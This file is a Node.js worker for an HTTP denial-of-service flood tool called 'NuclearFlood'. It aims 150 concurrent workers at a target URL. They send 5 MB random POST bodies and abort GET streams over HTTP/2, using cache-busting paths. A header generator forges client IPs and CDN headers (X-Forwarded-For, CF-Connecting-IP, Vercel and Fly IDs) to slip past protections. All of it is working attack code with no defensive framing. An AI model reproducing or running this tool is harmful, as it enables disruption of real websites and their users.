const http = require('http');
const https = require('https');
const http2 = require('http2');
const { URL } = require('url');
const got = require('got');
const crypto = require('crypto');

process.on('uncaughtException', (err, origin) => {
    const errorMessage = `FATAL: Uncaught Exception\nOrigin: ${origin}\nError: ${err.stack || err}`;
    console.error(errorMessage);
    try {
        if (process.send) {
            process.send({ type: 'error', data: errorMessage });
        }
    } finally {
        process.exit(1);
    }
});

process.on('unhandledRejection', (reason, promise) => {
    const errorMessage = `FATAL: Unhandled Rejection\nReason: ${reason.stack || reason}`;
    console.error(errorMessage);
    try {
        if (process.send) {
            process.send({ type: 'error', data: errorMessage });
        }
    } finally {
        process.exit(1);
    }
});

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.52",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "curl/7.81.0",
];

const referers = [
    "https://www.google.com/", "https://www.youtube.com/", "https://www.facebook.com/", "https://www.twitter.com/",
    "https://www.instagram.com/", "https://www.baidu.com/", "https://www.wikipedia.org/", "https://yandex.ru/",
    "https://yahoo.com/", "https://www.amazon.com/", "https://www.reddit.com/", "https://duckduckgo.com/", "https://www.bing.com/", "https://www.tiktok.com/",
    "https://www.linkedin.com/", "https://www.pinterest.com/", "https://www.tumblr.com/",
];

const acceptHeaders = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "application/json, text/plain, */*", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*",
    "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5", "*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json, text/javascript, */*; q=0.01",
];

function getRandomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function generateRandomString(length) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < length; i++) { result += chars.charAt(Math.floor(Math.random() * chars.length)); }
    return result;
}

class BypassGenerator {
    constructor() {
        this.browserProfiles = [
            {
                ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                ch: '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                platform: '"Windows"'
            },
            {
                ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                ch: '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                platform: '"macOS"'
            },
            {
                ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57",
                ch: '"Microsoft Edge";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
                platform: '"Windows"'
            },
            {
                ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
                ch: null, // Firefox doesn't send sec-ch-ua
                platform: '"Windows"'
            },
            {
                ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
                ch: '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
                platform: '"Linux"'
            },
            {
                ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
                ch: null, // Safari doesn't send sec-ch-ua
                platform: '"macOS"'
            },
            {
                ua: "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
                ch: '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
                platform: '"Android"'
            }
        ];
        this.acceptLanguages = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'de-DE,de;q=0.9,en;q=0.8', 'es-ES,es;q=0.9,en;q=0.8', 'fr-FR,fr;q=0.9,en;q=0.8'];
        this.fetchDest = ['document', 'empty', 'script', 'style', 'image', 'font', 'object', 'media'];
        this.fetchMode = ['navigate', 'same-origin', 'no-cors', 'cors'];
        this.fetchSite = ['none', 'same-origin', 'cross-site'];
    }

    generateHeaders() {
        const profile = getRandomElement(this.browserProfiles);
        const randomIp = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
        const referer = getRandomElement(referers);
        const origin = new URL(referer).origin;

        const dest = getRandomElement(this.fetchDest);
        const mode = getRandomElement(this.fetchMode);
        const site = (mode === 'navigate') ? getRandomElement(['none', 'cross-site']) : getRandomElement(this.fetchSite);

        const headers = {
            'accept': getRandomElement(acceptHeaders),
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': getRandomElement(this.acceptLanguages),
            'cache-control': getRandomElement(['no-cache', 'max-age=0', 'no-store', 'must-revalidate']),
            'pragma': 'no-cache',
            'referer': referer,
            'sec-fetch-dest': dest,
            'sec-fetch-mode': mode,
            'sec-fetch-site': site,
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': profile.ua,
            'te': 'trailers',
            'X-Forwarded-For': randomIp,
            'Via': `1.1 ${randomIp}`
        };

        if (Math.random() < 0.5) {
            headers['CF-Connecting-IP'] = randomIp;
        }
        if (Math.random() < 0.3) {
            headers['CF-IPCountry'] = 'US';
        }
        if (Math.random() < 0.4) {
            headers['X-Vercel-Id'] = `sfo1::${generateRandomString(5)}-${Date.now()}-${generateRandomString(12)}`;
        }
        if (Math.random() < 0.2) {
            headers['Fly-Request-Id'] = generateRandomString(22);
        }
        if (Math.random() > 0.4) {
            headers['origin'] = origin;
        }
        if (Math.random() > 0.5) {
            headers['dnt'] = '1'; // Do Not Track
        }
        if (Math.random() > 0.3) {
            headers['sec-gpc'] = '1'; // Global Privacy Control
        }

        if (profile.ch) {
            headers['sec-ch-ua'] = profile.ch;
            headers['sec-ch-ua-mobile'] = (profile.platform === '"Android"') ? '?1' : '?0';
            headers['sec-ch-ua-platform'] = profile.platform;
        }
        
        return headers;
    }

    generateComplexPayload() {
        const payloadType = getRandomElement(['json', 'form', 'nested-json', 'xml']);
        if (payloadType === 'json') {
            const jsonBody = {};
            for (let i = 0; i < 7; i++) {
                jsonBody[generateRandomString(8)] = generateRandomString(12);
            }
            return { contentType: 'application/json', body: JSON.stringify(jsonBody) };
        } else if (payloadType === 'form') {
            let formBody = '';
            for (let i = 0; i < 7; i++) {
                formBody += `${generateRandomString(8)}=${generateRandomString(12)}&`;
            }
            return { contentType: 'application/x-www-form-urlencoded', body: formBody.slice(0, -1) };
        } else if (payloadType === 'nested-json') {
            const jsonBody = {
                request_id: generateRandomString(16),
                user_data: {
                    id: Math.floor(Math.random() * 100000),
                    username: generateRandomString(10),
                    session_token: generateRandomString(32),
                    is_premium: Math.random() > 0.8
                },
                action: getRandomElement(['login', 'update_profile', 'get_data']),
                payload: {
                    [generateRandomString(6)]: generateRandomString(25),
                    [generateRandomString(8)]: { nested_key: generateRandomString(10) }
                },
                timestamp: Date.now()
            };
            return { contentType: 'application/json', body: JSON.stringify(jsonBody) };
        } else { // xml
            const key1 = generateRandomString(8);
            const val1 = generateRandomString(20);
            const key2 = generateRandomString(8);
            const val2 = generateRandomString(20);
            const xmlBody = `<?xml version="1.0"?><request><${key1}>${val1}</${key1}><${key2}>${val2}</${key2}></request>`;
            return { contentType: 'application/xml', body: xmlBody };
        }
    }
}

class NuclearFlood {
    constructor(targetUrl, threadCount, delay, stats, bypasser, largePayload) {
        this.targetUrl = targetUrl;
        this.threadCount = threadCount;
        this.delay = delay;
        this.stats = stats;
        this.running = false;
        this.bypasser = bypasser;
        this.largePayload = largePayload;
        try {
            this.url = new URL(targetUrl);
        } catch (e) { this.url = null; }
    }

    async sendRequest() {
        if (!this.url) return null;
        this.stats.total++;

        const strategy = Math.random();

        if (strategy < 0.7) {
            const method = 'POST';
            const path = this.url.pathname + (this.url.search ? `${this.url.search}&${generateRandomString(8)}=${Date.now()}` : `?${generateRandomString(8)}=${Date.now()}`);
            const headers = this.bypasser.generateHeaders();
            
            const randomPayload = this.largePayload;

            const options = {
                method: method,
                headers: {
                    ...headers,
                    'Content-Type': 'application/octet-stream',
                    'Content-Length': randomPayload.length,
                },
                body: randomPayload,
                http2: true,
                timeout: { request: 8000 },
                retry: { limit: 0 },
                throwHttpErrors: false,
            };

            try {
                await got(this.url.origin + path, options);
                this.stats.success++;
            } catch (error) {
                if (error.name === 'TimeoutError' || error.code === 'ETIMEDOUT') {
                    this.stats.success++;
                } else {
                    this.stats.failed++;
                }
            }
        } else {
            const path = this.url.pathname + (this.url.search ? `${this.url.search}&${generateRandomString(8)}=${Date.now()}` : `?${generateRandomString(8)}=${Date.now()}`);
            const headers = this.bypasser.generateHeaders();

            const stream = got.stream(this.url.origin + path, {
                method: 'GET',
                headers: headers,
                http2: true,
                timeout: { request: 8000 },
                retry: { limit: 0 },
                throwHttpErrors: false,
            });
            stream.on('request', (req) => {
                // IMPORTANT: Add a no-op error handler to the underlying request.
                // Destroying a request can emit an 'error' event. Without a listener,
                // this would crash the entire worker process.
                req.on('error', () => {});

                try {
                    req.destroy();
                    this.stats.success++;
                } catch (e) {
                    this.stats.failed++;
                }
            });
            stream.on('error', (error) => {
                if (error.name === 'TimeoutError' || error.code === 'ETIMEDOUT' || error.code === 'ECONNRESET') {
                    this.stats.success++;
                } else {
                    this.stats.failed++;
                }
            });
            stream.resume();
        }
    }

    async runWorker() {
        while (this.running) {
            try {
                await this.sendRequest();
            } catch (e) {}
            if (this.running && this.delay > 0) {
                await new Promise(resolve => setTimeout(resolve, this.delay));
            }
        }
    }

    start() {
        this.running = true;
        for (let i = 0; i < this.threadCount; i++) {
            this.runWorker();
        }
    }

    stop() {
        this.running = false;
    }
}

process.on('message', async ({ targetUrl, duration }) => {
    const threads = 150;
    const l7Delay = 900;

    const PAYLOAD_SIZE = 5 * 1024 * 1024;
    const largePayload = crypto.randomBytes(PAYLOAD_SIZE);

    const bypasser = new BypassGenerator();

    const stats = { total: 0, success: 0, failed: 0, phase: 'NuclearFlood' };

    const STATS_INTERVAL = 2000;
    let statsTimeout;
    let initialReportSent = false;

    const sendStats = () => {
        if (!initialReportSent || stats.total > 0 || stats.success > 0 || stats.failed > 0) {
            try {
                if (process.send) {
                    process.send({ type: 'stats', data: { ...stats } });
                    initialReportSent = true;
                }
            } catch (e) {
                if (statsTimeout) clearTimeout(statsTimeout);
                return;
            }
            stats.total = 0;
            stats.success = 0;
            stats.failed = 0;
        }
        statsTimeout = setTimeout(sendStats, STATS_INTERVAL);
    };

    sendStats(); // Mulai loop pelaporan statistik

    const totalDurationMs = duration * 1000;

    console.log(`[${new Date().toISOString()}] Starting attacker: NuclearFlood for ${duration}s`);
    const attacker = new NuclearFlood(targetUrl, threads, l7Delay, stats, bypasser, largePayload);

    if (!attacker.url) {
        console.error("NuclearFlood attacker could not be initialized. Invalid URL. Stopping worker.");
        if (statsTimeout) clearTimeout(statsTimeout);
        return;
    }

    try {
        attacker.start();
    } catch (e) {
        console.error(`Failed to start NuclearFlood`, e);
    }

    const attackStopper = setTimeout(() => {
        console.log(`[${new Date().toISOString()}] Stopping attacker: NuclearFlood`);
        attacker.stop();
        if (statsTimeout) clearTimeout(statsTimeout);
    }, totalDurationMs);

    process.on('disconnect', () => {
        if (statsTimeout) clearTimeout(statsTimeout);
        if (attackStopper) clearTimeout(attackStopper);
        if (attacker) attacker.stop();
    });
});